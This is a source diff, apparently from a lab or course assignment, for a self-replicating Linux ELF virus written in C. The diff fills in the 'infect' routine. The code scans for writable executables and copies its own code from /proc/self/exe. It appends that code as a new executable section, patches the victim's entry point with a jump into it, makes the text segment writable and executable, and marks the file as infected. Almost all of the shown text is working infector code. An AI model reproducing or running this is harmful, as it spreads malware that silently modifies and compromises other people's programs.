@@ -56,6 +56,17 @@ typedef long int intptr; /* ssize_t */
 #define	ELFCLASS64	2
 #define	ELFCLASSNUM	3
 
+#define ELFDATA2LSB	1
+
+/* These constants define the different elf file types */
+#define ET_NONE   0
+#define ET_REL    1
+#define ET_EXEC   2
+#define ET_DYN    3
+#define ET_CORE   4
+#define ET_LOPROC 0xff00
+#define ET_HIPROC 0xffff
+
 
 /* sh_type */
 #define SHT_NULL	0
@@ -162,11 +173,12 @@ typedef struct elf64_phdr {
 
 // resource.h
 
+#define RLIMIT_NPROC	6
 #define	RLIMIT_OFILE	8
 
 struct rlimit {
-	unsigned long	rlim_cur;		/* current (soft) limit */
-	unsigned long	rlim_max;		/* maximum value for rlim_cur */
+	unsigned long long	rlim_cur;		/* current (soft) limit */
+	unsigned long long	rlim_max;		/* maximum value for rlim_cur */
 };
 
 // end resource.h
@@ -1051,12 +1063,15 @@ int random_pick()
 	urand[10] = 'o';
 	urand[11] = 'm';
 	urand[12] = '\0';
-	f = open(urand, O_RDONLY);
-	read(f, &rand, 1);
+	if((f = open(urand, O_RDONLY)) < 0) {
+		return 0;
+	}
+	if(read(f, &rand, 1) != 1) {
+		return 0;
+	}
 	close(f);
 	
-	//return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
-	return 1; // nope, infecto 'em all
+	return rand;
 }
 
 int file_process(const char *fpath,
@@ -1067,7 +1082,7 @@ int file_process(const char *fpath,
 	if (can_execute(sb, fpath)
 		&& can_write(sb, fpath)
 		&& is_elf(fpath)
-		&& random_pick())
+		&& random_pick() % 5 < 5)
 	{
 		ret = infect(fpath);
 	}
@@ -1265,24 +1280,25 @@ void * my_memmem(const void *l, size_t l_len, const void *s, size_t s_len)
 // FIXME: your infection logic should be placed here and below.
 int infect(const char* fpath)
 {
-	char pay[0x1000];
-	//write(1, fpath, my_strlen(fpath));
-	//write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
-
-	int victim_fd = open(fpath, O_RDWR);
+	int victim_fd = open(fpath, O_RDWR | O_APPEND);
 	if(victim_fd<0) {
 		return -1;
 	}
-	struct stat victim_info;
-	fstat(victim_fd, &victim_info);
 
-	void* victim = (void *)mmap(0, victim_info.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, victim_fd, 0);
-
-	Elf64_Ehdr* victim_header = (Elf64_Ehdr*)victim;
-
-	if(victim_header->e_ident[EI_PAD + 2] == 0xAC && victim_header->e_ident[EI_PAD + 3] == 0x3D && victim_header->e_ident[EI_PAD + 4] == 0xC0 && victim_header->e_ident[EI_PAD + 5] == 0xDE) {
+	Elf64_Ehdr header;
+	if(read(victim_fd, (char*)&header, sizeof(header)) != sizeof(header)) {
 		close(victim_fd);
-		return 0;
+		return -1;
+	}
+
+	if(header.e_ident[EI_PAD + 4] == 0xC0 && header.e_ident[EI_PAD + 5] == 0xDE) {
+		close(victim_fd);
+		return -1;
+	}
+
+	if(header.e_type != ET_DYN || header.e_ident[EI_DATA] != ELFDATA2LSB) {
+		close(victim_fd);
+		return -1;
 	}
 
 	char self[32];
@@ -1304,115 +1320,350 @@ int infect(const char* fpath)
 
 	int virus_fd = open(self, O_RDONLY);
 	if(virus_fd<0) {
-		//write(1, "error /proc/self/exe\n", my_strlen("error /proc/self/exe\n"));
 		close(victim_fd);
 		return -1;
 	}
-	//write(1, "open /proc/self/exe succeed\n", my_strlen("open /proc/self/exe succeed\n"));
+	
 	struct stat virus_info;
 	fstat(virus_fd, &virus_info);
 	void* virus = (void *)mmap(0, virus_info.st_size, PROT_READ , MAP_SHARED, virus_fd, 0);
 
 	//Elf64_Ehdr* virus_header = (Elf64_Ehdr*)virus;
 
-	char sig[32];
-	// sig[0] = '\x90';
-	// sig[1] = '\x90';
-	// sig[2] = '\x90';
-	// sig[3] = '\x90';
-	// sig[4] = '\x48';
-	// sig[5] = '\x31';
-	// sig[6] = '\xec';
-	// sig[7] = '\x48';
-	// sig[8] = '\x31';
-	// sig[9] = '\xec';
-	// sig[10] = '\x90';
-	// sig[11] = '\x90';
+	// char sig_main[12];
 
-	sig[0] = '\x48';
-	sig[1] = '\x83';
-	sig[2] = '\xec';
-	sig[3] = '\x18';
-	sig[4] = '\x31';
-	sig[5] = '\xc0';
-	sig[6] = '\xc6';
-	sig[7] = '\x44';
-	sig[8] = '\x24';
-	sig[9] = '\x0f';
-	sig[10] = '\x2e';
-	sig[11] = '\xe8';
+	// sig_main[0] = '\x48';
+	// sig_main[1] = '\x83';
+	// sig_main[2] = '\xec';
 
-	Elf64_Addr sig_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig, 12);
+	// sig_main[3] = '\x18';
+	// sig_main[4] = '\x31';
+	// sig_main[5] = '\xc0';
+	// sig_main[6] = '\xc6';
+	// sig_main[7] = '\x44';
+	// sig_main[8] = '\x24';
+	// sig_main[9] = '\x0f';
+	// sig_main[10] = '\x2e';
+	// sig_main[11] = '\xe8';
 
-	if(sig_pos == NULL) {
-		//write(1, "error memmem\n", my_strlen("error memmem\n"));
+	char sig_nop[12];
+	sig_nop[0] = '\x90';
+	sig_nop[1] = '\x90';
+	sig_nop[2] = '\x90';
+	sig_nop[3] = '\x90';
+	sig_nop[4] = '\x48';
+	sig_nop[5] = '\x31';
+	sig_nop[6] = '\xec';
+	sig_nop[7] = '\x48';
+	sig_nop[8] = '\x31';
+	sig_nop[9] = '\xec';
+	sig_nop[10] = '\x90';
+	sig_nop[11] = '\x90';
+
+	char sig_end[10];
+	sig_end[0] = '\xE0';
+	sig_end[1] = '\x5B';
+	sig_end[2] = '\x41';
+	sig_end[3] = '\x5C';
+	sig_end[4] = '\x41';
+	sig_end[5] = '\x5D';
+	sig_end[6] = '\x41';
+	sig_end[7] = '\x5E';
+	sig_end[8] = '\x5D';
+	sig_end[9] = '\xC3';
+
+	//Elf64_Addr sig_main_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig_main, 12);
+	Elf64_Addr sig_nop_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig_nop, 12);
+	Elf64_Addr sig_end_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig_end, 10);
+
+	if(sig_nop_pos == NULL || sig_end_pos == NULL) {
 		close(victim_fd);
 		close(virus_fd);
 		return -1;
 	}
 
-	// if(DEBUG) {
-	// 	char tmp_memmem[32];
-	// 	itoa(sig_pos & 0x7fffffff, tmp_memmem, 16);
-	// 	write(1, "memmem : ", my_strlen("memmem : "));
-	// 	write(1, tmp_memmem, my_strlen(tmp_memmem));
-	// 	char newline = '\n';
-	// 	write(1, &newline, 1);
-	// }
+	size_t req_size = sig_end_pos + 10 - sig_nop_pos;
 
-	// I don't know why main comes before start asm..
-	// thus start from main, located at -(0x129 - 0xe8) in one sample
-	// changing function main to my_main solved it, but it breaks code execution
-	// thus changing signature to main
-	my_memmove(pay, (void *)sig_pos, REQ_SIZE);
+	char pay[req_size];
 
+	my_memmove(pay, (void *)sig_nop_pos, req_size);
 
-	Elf64_Phdr* pHeader[victim_header->e_phnum];
+	struct stat victim_info;
+	fstat(victim_fd, &victim_info);
+
+	size_t origin_size = victim_info.st_size;
+
+#define LEN_PRE		67
+#define LEN_SUF		68
+
+	char nullbyte = '\x90';
+	for(int i = 0 ; i < LEN_PRE + LEN_SUF + req_size + header.e_shentsize + 0x100 ; i++) {
+		if(write(victim_fd, &nullbyte, 1) != 1) {
+			close(victim_fd);
+			return -1;
+		}
+	}
+
+	fstat(victim_fd, &victim_info);
+
+	void* victim = (void *)mmap(0, victim_info.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, victim_fd, 0);
+
+	Elf64_Ehdr* victim_header = (Elf64_Ehdr*)victim;
+
+	Elf64_Phdr* p_pHeader[victim_header->e_phnum];
 	Elf64_Half textseg = 0;
 
 	char* pos = victim + victim_header->e_phoff;
 	for(int i = 0 ; i < victim_header->e_phnum ; i++) {
-		pHeader[i] = (Elf64_Phdr*)pos;
-		if(pHeader[i]->p_type == PT_LOAD && pHeader[i]->p_flags & (PF_R | PF_X)) {
+		p_pHeader[i] = (Elf64_Phdr*)pos;
+		if(p_pHeader[i]->p_type == PT_LOAD && p_pHeader[i]->p_flags & (PF_R | PF_X)) {
 			textseg = (Elf64_Half)(i-1);
 		}
 		pos += victim_header->e_phentsize;
 	}
 
-	Elf64_Off padding;
+	Elf64_Addr base = header.e_entry;
+	Elf64_Shdr new_sHeader;
+	new_sHeader.sh_name = 3;
+	new_sHeader.sh_type = SHT_PROGBITS;
+	new_sHeader.sh_flags = SHF_ALLOC | SHF_EXECINSTR;
+	//new_sHeader.sh_addr = sHeader[textsec].sh_addr + 0x1000;
+	//new_sHeader.sh_addr = 0x1000;
+	new_sHeader.sh_addr = p_pHeader[textseg]->p_memsz + 0x1000 - (p_pHeader[textseg]->p_memsz % 0x1000);
+	new_sHeader.sh_offset = victim_header->e_shoff + victim_header->e_shentsize * (victim_header->e_shnum + 1);
+	new_sHeader.sh_size = LEN_PRE + req_size + LEN_SUF;
+	new_sHeader.sh_link = SHN_UNDEF;
+	new_sHeader.sh_info = 0;
+	new_sHeader.sh_addralign = 0;
+	new_sHeader.sh_entsize = 0;
 
-	padding = pHeader[textseg - 1]->p_offset + pHeader[textseg - 1]->p_filesz;
+	my_memmove(victim + origin_size, &new_sHeader, sizeof(new_sHeader));
+
+#define LEN_JMP		5
+	char tmp_entry[LEN_JMP];
+	char jump_code[LEN_JMP];
+	jump_code[0] = '\xe9';
+	jump_code[1] = '\x00';
+	jump_code[2] = '\x00';
+	jump_code[3] = '\x00';
+	jump_code[4] = '\x00';
+
+	int offset = 0;
+	int imm = 0;
+	char xor = random_pick();
+
+	my_memmove(tmp_entry, victim + base, LEN_JMP);
 	
-	int offset = padding + REQ_SIZE - victim_header->e_entry;
-	char tmp_offset[32];
-	tmp_offset[0] = '\x90';
-	tmp_offset[1] = '\x90';
-	tmp_offset[2] = '\x90';
-	tmp_offset[3] = '\x90';
-	tmp_offset[4] = '\xe9';
+	offset = new_sHeader.sh_addr - base - LEN_JMP;
 
-	if( offset < 0 ) {
-		offset = -offset;
-		for(int i = 0 ; i < 4 ; i++) {
-			tmp_offset[5+i] = (char)(offset & 0x000000ff);
-			offset = offset >> 8;
-		}
-		
-	} else {
-		offset = 0x0fffffff - offset + 1;
-		for(int i = 0 ; i < 3 ; i++) {
-			tmp_offset[5+i] = (char)(offset & 0x000000ff);
-			offset = offset >> 8;
-		}
-		tmp_offset[8] = '\xff';
+	for(int i = 0 ; i < 3 ; i++) {
+		jump_code[1+i] = (char)(offset & 0x000000ff);
+		offset = offset >> 8;
+	}
+	jump_code[4] = '\x00';
+
+
+	char code_prefix[LEN_PRE];
+	code_prefix[0] = '\x90';
+	code_prefix[1] = '\x90';
+	code_prefix[2] = '\x90';
+	code_prefix[3] = '\x90';
+	code_prefix[4] = '\x90';
+	code_prefix[5] = '\x90';
+	code_prefix[6] = '\x90';
+	code_prefix[7] = '\x90';
+	code_prefix[8] = '\x50';
+	code_prefix[9] = '\x53';
+	code_prefix[10] = '\x51';
+	code_prefix[11] = '\x52';
+	code_prefix[12] = '\x56';
+	code_prefix[13] = '\x57';
+	code_prefix[14] = '\x55';
+	code_prefix[15] = '\x54';
+	code_prefix[16] = '\x41';
+	code_prefix[17] = '\x50';
+	code_prefix[18] = '\x41';
+	code_prefix[19] = '\x51';
+	code_prefix[20] = '\x41';
+	code_prefix[21] = '\x52';
+	code_prefix[22] = '\x41';
+	code_prefix[23] = '\x53';
+	code_prefix[24] = '\x41';
+	code_prefix[25] = '\x54';
+	code_prefix[26] = '\x41';
+	code_prefix[27] = '\x55';
+	code_prefix[28] = '\x41';
+	code_prefix[29] = '\x56';
+	code_prefix[30] = '\x41';
+	code_prefix[31] = '\x57';
+	code_prefix[32] = '\x4c';
+	code_prefix[33] = '\x8d';
+	code_prefix[34] = '\x3d';
+	code_prefix[35] = '\xde';
+	code_prefix[36] = '\xc0';
+	code_prefix[37] = '\x00';
+	code_prefix[38] = '\x00';
+	code_prefix[39] = '\x4d';
+	code_prefix[40] = '\x31';
+	code_prefix[41] = '\xf6';
+	code_prefix[42] = '\x43';
+	code_prefix[43] = '\x80';
+	code_prefix[44] = '\x34';
+	code_prefix[45] = '\x37';
+	code_prefix[46] = '\x00';
+	code_prefix[47] = '\x49';
+	code_prefix[48] = '\xff';
+	code_prefix[49] = '\xc6';
+	code_prefix[50] = '\x49';
+	code_prefix[51] = '\x81';
+	code_prefix[52] = '\xfe';
+	code_prefix[53] = '\xed';
+	code_prefix[54] = '\xac';
+	code_prefix[55] = '\x00';
+	code_prefix[56] = '\x00';
+	code_prefix[57] = '\x75';
+	code_prefix[58] = '\xef';
+	code_prefix[59] = '\x90';
+	code_prefix[60] = '\x90';
+	code_prefix[61] = '\x90';
+	code_prefix[62] = '\x90';
+	code_prefix[63] = '\x90';
+	code_prefix[64] = '\x90';
+	code_prefix[65] = '\x90';
+	code_prefix[66] = '\x90';
+
+	char code_suffix[LEN_SUF];
+	code_suffix[0] = '\x90';
+	code_suffix[1] = '\x90';
+	code_suffix[2] = '\x90';
+	code_suffix[3] = '\x90';
+	code_suffix[4] = '\x90';
+	code_suffix[5] = '\x90';
+	code_suffix[6] = '\x90';
+	code_suffix[7] = '\x90';
+	code_suffix[8] = '\x4c';
+	code_suffix[9] = '\x8d';
+	code_suffix[10] = '\x3d';
+	code_suffix[11] = '\x13';
+	code_suffix[12] = '\x53';
+	code_suffix[13] = '\xff';
+	code_suffix[14] = '\xff';
+	code_suffix[15] = '\x41';
+	code_suffix[16] = '\xc6';
+	code_suffix[17] = '\x07';
+	code_suffix[18] = '\xca';
+	code_suffix[19] = '\x41';
+	code_suffix[20] = '\xc6';
+	code_suffix[21] = '\x47';
+	code_suffix[22] = '\x01';
+	code_suffix[23] = '\xfe';
+	code_suffix[24] = '\x41';
+	code_suffix[25] = '\xc6';
+	code_suffix[26] = '\x47';
+	code_suffix[27] = '\x02';
+	code_suffix[28] = '\xba';
+	code_suffix[29] = '\x41';
+	code_suffix[30] = '\xc6';
+	code_suffix[31] = '\x47';
+	code_suffix[32] = '\x03';
+	code_suffix[33] = '\xba';
+	code_suffix[34] = '\x41';
+	code_suffix[35] = '\xc6';
+	code_suffix[36] = '\x47';
+	code_suffix[37] = '\x04';
+	code_suffix[38] = '\xbe';
+	code_suffix[39] = '\x41';
+	code_suffix[40] = '\x5f';
+	code_suffix[41] = '\x41';
+	code_suffix[42] = '\x5e';
+	code_suffix[43] = '\x41';
+	code_suffix[44] = '\x5d';
+	code_suffix[45] = '\x41';
+	code_suffix[46] = '\x5c';
+	code_suffix[47] = '\x41';
+	code_suffix[48] = '\x5b';
+	code_suffix[49] = '\x41';
+	code_suffix[50] = '\x5a';
+	code_suffix[51] = '\x41';
+	code_suffix[52] = '\x59';
+	code_suffix[53] = '\x41';
+	code_suffix[54] = '\x58';
+	code_suffix[55] = '\x5c';
+	code_suffix[56] = '\x5d';
+	code_suffix[57] = '\x5f';
+	code_suffix[58] = '\x5e';
+	code_suffix[59] = '\x5a';
+	code_suffix[60] = '\x59';
+	code_suffix[61] = '\x5b';
+	code_suffix[62] = '\x58';
+	code_suffix[63] = '\xe9';
+	code_suffix[64] = '\x00';
+	code_suffix[65] = '\x00';
+	code_suffix[66] = '\x00';
+	code_suffix[67] = '\x00';
+
+#define PRE_LEA_POS		0x27
+#define PRE_CMP_POS		0x35
+#define PRE_XOR_POS		0x2e
+
+	offset = new_sHeader.sh_addr + PRE_LEA_POS - base;
+	offset = 0x0fffffff - offset + 1;
+	for(int i = 0 ; i < 3 ; i++) {
+		code_prefix[(PRE_LEA_POS-4)+i] = (char)(offset & 0x000000ff);
+		offset = offset >> 8;
+	}
+	code_prefix[PRE_LEA_POS - 1] = '\xff';
+
+	imm = req_size;
+	for(int i = 0 ; i < 4 ; i++) {
+		code_prefix[PRE_CMP_POS+i] = (char)(imm & 0x000000ff);
+		imm = imm >> 8;
 	}
 
-	my_memmove(victim + padding, tmp_offset, REQ_SIZE);
+	//code_prefix[PRE_XOR_POS] = xor;
 
-	pHeader[textseg - 1]->p_filesz += REQ_SIZE;
-	pHeader[textseg - 1]->p_memsz += REQ_SIZE;
-	victim_header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding);
+#define SUF_LEA_POS		0xf
+#define SUF_JMP_POS		LEN_SUF
 
+	offset = new_sHeader.sh_addr + LEN_PRE + req_size + SUF_LEA_POS - base;
+	offset = 0x0fffffff - offset + 1;
+	for(int i = 0 ; i < 3 ; i++) {
+		code_suffix[(SUF_LEA_POS - 4)+i] = (char)(offset & 0x000000ff);
+		offset = offset >> 8;
+	}
+	code_suffix[SUF_LEA_POS - 1] = '\xff';
+
+	offset = new_sHeader.sh_addr + LEN_PRE + req_size + SUF_JMP_POS - base;
+	offset = 0x0fffffff - offset + 1;
+	for(int i = 0 ; i < 3 ; i++) {
+		code_suffix[(SUF_JMP_POS - 4)+i] = (char)(offset & 0x000000ff);
+		offset = offset >> 8;
+	}
+	code_suffix[SUF_JMP_POS - 1] = '\xff';
+
+#define PATCH_POS		0x12
+
+	code_suffix[PATCH_POS] = tmp_entry[0];
+	code_suffix[PATCH_POS + 5] = tmp_entry[1];
+	code_suffix[PATCH_POS + 10] = tmp_entry[2];
+	code_suffix[PATCH_POS + 15] = tmp_entry[3];
+	code_suffix[PATCH_POS + 20] = tmp_entry[4];
+
+	// for(int i = 0 ; i < req_size ; i++) {
+	// 	pay[i] ^= xor;
+	// }
+
+	my_memmove(victim + new_sHeader.sh_offset, code_prefix, LEN_PRE);
+	my_memmove(victim + new_sHeader.sh_offset + LEN_PRE, pay, req_size);
+	my_memmove(victim + new_sHeader.sh_offset + LEN_PRE + req_size, code_suffix, LEN_SUF);
+	my_memmove(victim + header.e_entry, jump_code, LEN_JMP);
+
+	victim_header->e_shnum += 1;
+	p_pHeader[textseg]->p_flags = PF_R | PF_W | PF_X;
+	//p_pHeader[textseg]->p_memsz += (0x1000 - p_pHeader[textseg]->p_memsz % 0x1000) + ((LEN_PRE + req_size + LEN_SUF) / 0x1000 + 1) * 0x1000;
+	//p_pHeader[textseg]->p_filesz += (0x1000 - p_pHeader[textseg]->p_filesz % 0x1000) + ((LEN_PRE + req_size + LEN_SUF) / 0x1000 + 1) * 0x1000;
+	p_pHeader[textseg]->p_memsz += 0x3000;
+	p_pHeader[textseg]->p_filesz += 0x3000;
 	victim_header->e_ident[EI_PAD + 2] = 0xAC;
 	victim_header->e_ident[EI_PAD + 3] = 0x3D;
 	victim_header->e_ident[EI_PAD + 4] = 0xC0;
